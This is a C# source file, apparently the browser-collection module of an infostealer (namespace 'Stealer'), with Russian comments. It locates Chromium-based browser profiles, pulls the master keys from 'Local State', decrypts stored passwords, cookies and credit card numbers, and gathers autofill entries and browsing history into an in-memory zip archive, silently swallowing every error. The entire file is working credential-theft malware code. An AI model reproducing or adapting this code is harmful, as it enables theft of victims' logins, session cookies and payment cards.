using System;
using System.Collections.Concurrent;
using System.IO;
using System.Text;
using Stealer.Crypto;
using Stealer.Utils;

namespace Stealer.Collectors
{
    public class ChromiumCollector
    {
        public static void Collect(InMemoryZip zip)
        {
            var stats = new ConcurrentBag<string>();

            foreach (var browserPath in BrowserPaths.ChromiumBrowsers)
            {
                try
                {
                    if (!Directory.Exists(browserPath))
                        continue;

                    string browserName = BrowserPaths.GetBrowserName(browserPath);
                    string localStatePath = Path.Combine(browserPath, "Local State");

                    if (!File.Exists(localStatePath))
                        continue;

                    byte[] masterKeyV10 = LocalState.GetMasterKeyV10(localStatePath);
                    byte[] masterKeyV20 = LocalState.GetMasterKeyV20(localStatePath);
                    
                    if (masterKeyV10 == null && masterKeyV20 == null)
                        continue;

                    // Собираем все профили
                    var profiles = Directory.GetDirectories(browserPath);

                    foreach (string profileDir in profiles)
                    {
                        string profileName = Path.GetFileName(profileDir);
                        
                        // Пропускаем системные папки
                        if (IsSystemFolder(profileName))
                            continue;

                        CollectProfile(zip, stats, browserPath, profileDir, browserName, profileName, masterKeyV10, masterKeyV20);
                    }
                }
                catch
                {
                }
            }
        }

        private static bool IsSystemFolder(string folderName)
        {
            string[] systemFolders = {
                "System", "Crashpad", "ShaderCache", "GrShaderCache",
                "component_crx_cache", "optimization_guide_model_store",
                "Ad Blocking", "Autofill", "AutoLaunchProtocolsComponent",
                "BrowserMetrics", "CertificateRevocation", "CertificateTransparency",
                "ClientSidePhishing", "CrowdDeny", "DownloadBubble",
                "FileTypePolicies", "FirstPartySets", "OriginTrials",
                "TrustTokenKeyCommitments", "ZxcvbnData", "hyphen-data",
                "MEIPreload", "OptimizationHints", "PrivacySandbox",
                "SafetyTips", "Subresource Filter", "VR Assets",
                "DeferredBrowserMetrics", "Domain Actions", "EADPData Component",
                "Edge Data Protection Lists", "Edge Entity Extraction", "Edge Notifications",
                "Edge Shopping", "Edge Sidebar", "Edge Signal Triggers", "Edge Themes Resources",
                "Edge Wallet", "Edge3pSerp", "EdgeArbitration", "EdgeLanguageDetectionModel",
                "extensions_crx_cache", "GraphiteDawnCache", "Nurturing", "PKIMetadata",
                "ProvenanceData", "ProvenanceDataAllowList", "ProvenanceDataTensors",
                "RecoveryImproved", "Safe Browsing", "SmartScreen", "Speech Recognition",
                "Trust Protection Lists", "Typosquatting", "Web Notifications Deny List",
                "Webstore Downloads", "Well Known Domains", "WidevineCdm", "WorkspacesNavigationComponent",
                "AmountExtractionHeuristicRegexes", "Crash Reports", "MediaFoundationWidevineCdm",
                "AsrSubtitles", "configs", "CustomRootPKIMetadata", "discard_ml", "ecom",
                "file_rating", "google_import_script", "gpu_configs_overrides", "InternalPromo",
                "neuroedit", "neuro_question", "page_dssm", "readability_ml", "segmentation_platform",
                "SSLErrorAssistant", "SuggestCatboostModel", "tc", "ui_config", "video_translation",
                "web_app_config", "YandexDictionaries", "YandexOfflineSpellchecker", "YandexStore",
                "yandex_payments_autofill_popup"
            };

            foreach (var sys in systemFolders)
            {
                if (folderName.StartsWith(sys) || folderName == sys)
                    return true;
            }
            return false;
        }

        private static void CollectProfile(InMemoryZip zip, ConcurrentBag<string> stats, 
            string browserPath, string profileDir, string browserName, string profileName, byte[] masterKeyV10, byte[] masterKeyV20)
        {
            try
            {
                int passwordCount = 0;
                int cookieCount = 0;
                int cardCount = 0;
                int autofillCount = 0;
                int historyCount = 0;

                // Passwords
                string loginDataPath = Path.Combine(profileDir, "Login Data");
                if (File.Exists(loginDataPath))
                {
                    try
                    {
                        passwordCount += CollectPasswords(zip, loginDataPath, browserName, profileName, masterKeyV10, masterKeyV20);
                    }
                    catch
                    {
                    }
                }

                // Cookies
                string cookiesPath = Path.Combine(profileDir, "Network", "Cookies");
                if (!File.Exists(cookiesPath))
                    cookiesPath = Path.Combine(profileDir, "Cookies");
                
                if (File.Exists(cookiesPath))
                {
                    try
                    {
                        cookieCount += CollectCookies(zip, cookiesPath, browserName, profileName, masterKeyV10, masterKeyV20);
                    }
                    catch
                    {
                    }
                }

                // Credit Cards
                string webDataPath = Path.Combine(profileDir, "Web Data");
                if (File.Exists(webDataPath))
                {
                    try
                    {
                        cardCount += CollectCreditCards(zip, webDataPath, browserName, profileName, masterKeyV10, masterKeyV20);
                    }
                    catch
                    {
                    }

                    try
                    {
                        autofillCount += CollectAutofill(zip, webDataPath, browserName, profileName);
                    }
                    catch
                    {
                    }
                }

                // History
                string historyPath = Path.Combine(profileDir, "History");
                if (File.Exists(historyPath))
                {
                    try
                    {
                        historyCount += CollectHistory(zip, historyPath, browserName, profileName);
                    }
                    catch
                    {
                    }
                }

                // Добавляем статистику если что-то нашли
                if (passwordCount > 0 || cookieCount > 0 || cardCount > 0 || autofillCount > 0 || historyCount > 0)
                {
                    stats.Add($"[{browserName}] {profileName}:");
                    if (passwordCount > 0) stats.Add($"  Passwords: {passwordCount}");
                    if (cookieCount > 0) stats.Add($"  Cookies: {cookieCount}");
                    if (cardCount > 0) stats.Add($"  Cards: {cardCount}");
                    if (autofillCount > 0) stats.Add($"  Autofill: {autofillCount}");
                    if (historyCount > 0) stats.Add($"  History: {historyCount}");
                    stats.Add("");
                }
            }
            catch
            {
            }
        }

        private static byte[] HexStringToByteArray(string hex)
        {
            if (string.IsNullOrEmpty(hex))
                return new byte[0];
                
            hex = hex.Replace("-", "");
            
            if (hex.Length % 2 != 0)
                return new byte[0];
                
            byte[] bytes = new byte[hex.Length / 2];
            for (int i = 0; i < bytes.Length; i++)
            {
                bytes[i] = Convert.ToByte(hex.Substring(i * 2, 2), 16);
            }
            return bytes;
        }

        private static int CollectPasswords(InMemoryZip zip, string dbPath, string browserName, string profileName, byte[] masterKeyV10, byte[] masterKeyV20)
        {
            try
            {
                if (!File.Exists(dbPath))
                    return 0;

                var passwords = new ConcurrentBag<string>();
                int count = 0;

                var parser = SQLiteParser.ReadTable(dbPath, "logins");
                
                if (parser != null)
                {
                    for (int i = 0; i < parser.GetRowCount(); i++)
                    {
                        try
                        {
                            string url = parser.GetValue(i, 0);
                            string username = parser.GetValue(i, 1);
                            string encryptedPasswordStr = parser.GetValue(i, 2);

                            if (string.IsNullOrEmpty(url) || string.IsNullOrEmpty(username) || string.IsNullOrEmpty(encryptedPasswordStr))
                                continue;

                            byte[] encryptedPassword = Encoding.Default.GetBytes(encryptedPasswordStr);
                            
                            if (encryptedPassword.Length < 31)
                                continue;

                            byte[] decryptedPassword = AesGcmBrowser.Decrypt(encryptedPassword, masterKeyV10, masterKeyV20);

                            if (decryptedPassword != null && decryptedPassword.Length > 0)
                            {
                                string password = Encoding.UTF8.GetString(decryptedPassword);
                                passwords.Add($"URL: {url}\nUsername: {username}\nPassword: {password}\n");
                                count++;
                            }
                        }
                        catch { }
                    }
                }

                if (passwords.Count > 0)
                {
                    string fileName = $"Browsers/{browserName}/Passwords_{profileName}.txt";
                    zip.AddTextFile(fileName, string.Join("\n", passwords));
                }

                return count;
            }
            catch
            {
                return 0;
            }
        }

        private static int CollectCookies(InMemoryZip zip, string dbPath, string browserName, string profileName, byte[] masterKeyV10, byte[] masterKeyV20)
        {
            try
            {
                if (!File.Exists(dbPath))
                    return 0;

                FileInfo fileInfo = new FileInfo(dbPath);

                // Пропускаем слишком большие базы данных (больше 50 MB)
                if (fileInfo.Length > 50 * 1024 * 1024)
                    return 0;

                var cookies = new ConcurrentBag<string>();
                int count = 0;

                SQLiteParser parser = null;
                try
                {
                    parser = SQLiteParser.ReadTable(dbPath, "cookies");
                }
                catch
                {
                }

                if (parser == null)
                    return 0;

                int colHost = parser.GetFieldIndex("host_key");
                int colName = parser.GetFieldIndex("name");
                int colValue = parser.GetFieldIndex("value");
                int colEncVal = parser.GetFieldIndex("encrypted_value");
                int colPath = parser.GetFieldIndex("path");
                int colExpires = parser.GetFieldIndex("expires_utc");
                int colSecure = parser.GetFieldIndex("is_secure");
                if (colSecure == -1) colSecure = parser.GetFieldIndex("secure");
                int colHttpOnly = parser.GetFieldIndex("is_httponly");
                if (colHttpOnly == -1) colHttpOnly = parser.GetFieldIndex("httponly");

                if (colHost == -1 || colName == -1)
                    return 0;

                int rowCount = parser.GetRowCount();
                int processedCount = 0;
                int emptyCount = 0;
                int decryptFailCount = 0;

                for (int i = 0; i < rowCount; i++)
                {
                    try
                    {
                        string host = colHost >= 0 ? (parser.GetValue(i, colHost) ?? "") : "";
                        string name = colName >= 0 ? (parser.GetValue(i, colName) ?? "") : "";
                        string plainValue = colValue >= 0 ? (parser.GetValue(i, colValue) ?? "") : "";
                        string encryptedValueStr = colEncVal >= 0 ? (parser.GetValue(i, colEncVal) ?? "") : "";
                        string path = colPath >= 0 ? (parser.GetValue(i, colPath) ?? "") : "/";
                        string expires = colExpires >= 0 ? (parser.GetValue(i, colExpires) ?? "0") : "0";
                        string isSecure = colSecure >= 0 ? (parser.GetValue(i, colSecure) ?? "0") : "0";
                        string isHttpOnly = colHttpOnly >= 0 ? (parser.GetValue(i, colHttpOnly) ?? "0") : "0";

                        if (string.IsNullOrEmpty(host) || string.IsNullOrEmpty(name))
                        {
                            emptyCount++;
                            continue;
                        }

                        processedCount++;
                        string cookieValue = "";
                        
                        // Сначала проверяем plain value (старые куки)
                        if (!string.IsNullOrEmpty(plainValue))
                        {
                            cookieValue = plainValue;
                        }
                        // Если plain value пустой - расшифровываем encrypted_value
                        else if (!string.IsNullOrEmpty(encryptedValueStr))
                        {
                            // Конвертируем строку обратно в байты безопасно (без потери байтов > 127)
                            byte[] encryptedValue = Encoding.GetEncoding("iso-8859-1").GetBytes(encryptedValueStr);
                            
                            if (encryptedValue.Length >= 31)
                            {
                                // Определяем версию шифрования по префиксу
                                // v10 = 76 31 30 (ASCII "v10")
                                // v20 = 76 32 30 (ASCII "v20")
                                bool isV10 = encryptedValue.Length >= 3 && 
                                            encryptedValue[0] == 0x76 && 
                                            encryptedValue[1] == 0x31 && 
                                            encryptedValue[2] == 0x30;
                                
                                // Передаем оба ключа - пусть AesGcmBrowser сам выберет
                                byte[] decryptedValue = AesGcmBrowser.Decrypt(encryptedValue, masterKeyV10, masterKeyV20, true);

                                if (decryptedValue != null && decryptedValue.Length > 0)
                                {
                                    cookieValue = Encoding.UTF8.GetString(decryptedValue);
                                }
                                else
                                {
                                    decryptFailCount++;
                                }
                            }
                            else
                            {
                                decryptFailCount++;
                            }
                        }
                        else
                        {
                            emptyCount++;
                        }

                        if (!string.IsNullOrEmpty(cookieValue))
                        {
                            string httpOnlyStr = (isHttpOnly == "1") ? "TRUE" : "FALSE";
                            cookies.Add($"{host}\t{httpOnlyStr}\t{path}\t{isSecure}\t{expires}\t{name}\t{cookieValue}");
                            count++;
                        }
                    }
                    catch { }
                }

                if (cookies.Count > 0)
                {
                    string fileName = $"Browsers/{browserName}/Cookies_{profileName}.txt";
                    zip.AddTextFile(fileName, string.Join("\n", cookies));
                }

                return count;
            }
            catch
            {
                return 0;
            }
        }

        private static int CollectCreditCards(InMemoryZip zip, string dbPath, string browserName, string profileName, byte[] masterKeyV10, byte[] masterKeyV20)
        {
            try
            {
                if (!File.Exists(dbPath))
                    return 0;

                var cards = new ConcurrentBag<string>();
                int count = 0;

                var parser = SQLiteParser.ReadTable(dbPath, "credit_cards");
                
                if (parser != null)
                {
                    for (int i = 0; i < parser.GetRowCount(); i++)
                    {
                        try
                        {
                            string nameOnCard = parser.GetValue(i, 0) ?? "";
                            string expMonth = parser.GetValue(i, 1) ?? "";
                            string expYear = parser.GetValue(i, 2) ?? "";
                            string encryptedNumberStr = parser.GetValue(i, 3) ?? "";

                            if (string.IsNullOrEmpty(nameOnCard) || string.IsNullOrEmpty(encryptedNumberStr))
                                continue;

                            byte[] encryptedNumber = Encoding.Default.GetBytes(encryptedNumberStr);
                            
                            if (encryptedNumber.Length < 31)
                                continue;

                            byte[] decryptedNumber = AesGcmBrowser.Decrypt(encryptedNumber, masterKeyV10, masterKeyV20);

                            if (decryptedNumber != null && decryptedNumber.Length > 0)
                            {
                                string cardNumber = Encoding.UTF8.GetString(decryptedNumber);
                                cards.Add($"Card: {cardNumber}\nName: {nameOnCard}\nExpires: {expMonth}/{expYear}\n");
                                count++;
                            }
                        }
                        catch { }
                    }
                }

                if (cards.Count > 0)
                {
                    string fileName = $"Browsers/{browserName}/CreditCards_{profileName}.txt";
                    zip.AddTextFile(fileName, string.Join("\n", cards));
                }

                return count;
            }
            catch
            {
                return 0;
            }
        }

        private static int CollectAutofill(InMemoryZip zip, string dbPath, string browserName, string profileName)
        {
            try
            {
                if (!File.Exists(dbPath))
                    return 0;

                var autofills = new ConcurrentBag<string>();
                int count = 0;

                var parser = SQLiteParser.ReadTable(dbPath, "autofill");
                
                if (parser != null)
                {
                    for (int i = 0; i < parser.GetRowCount(); i++)
                    {
                        try
                        {
                            string name = parser.GetValue(i, 0) ?? "";
                            string value = parser.GetValue(i, 1) ?? "";

                            if (!string.IsNullOrEmpty(name) && !string.IsNullOrEmpty(value))
                            {
                                autofills.Add($"Field: {name}\nValue: {value}\n");
                                count++;
                            }
                        }
                        catch { }
                    }
                }

                if (autofills.Count > 0)
                {
                    string fileName = $"Browsers/{browserName}/Autofill_{profileName}.txt";
                    zip.AddTextFile(fileName, string.Join("\n", autofills));
                }

                return count;
            }
            catch
            {
                return 0;
            }
        }

        private static int CollectHistory(InMemoryZip zip, string dbPath, string browserName, string profileName)
        {
            try
            {
                var history = new ConcurrentBag<string>();
                int count = 0;

                var parser = SQLiteParser.ReadTable(dbPath, "urls");
                
                if (parser != null)
                {
                    int maxRows = Math.Min(parser.GetRowCount(), 1000);
                    
                    for (int i = 0; i < maxRows; i++)
                    {
                        try
                        {
                            string url = parser.GetValue(i, 1) ?? "";
                            string title = parser.GetValue(i, 2) ?? "";
                            string visitCount = parser.GetValue(i, 3) ?? "0";

                            if (!string.IsNullOrEmpty(url))
                            {
                                history.Add($"URL: {url}\nTitle: {title}\nVisits: {visitCount}\n");
                                count++;
                            }
                        }
                        catch { }
                    }
                }

                if (history.Count > 0)
                {
                    string fileName = $"Browsers/{browserName}/History_{profileName}.txt";
                    zip.AddTextFile(fileName, string.Join("\n", history));
                }

                return count;
            }
            catch
            {
                return 0;
            }
        }
    }
}
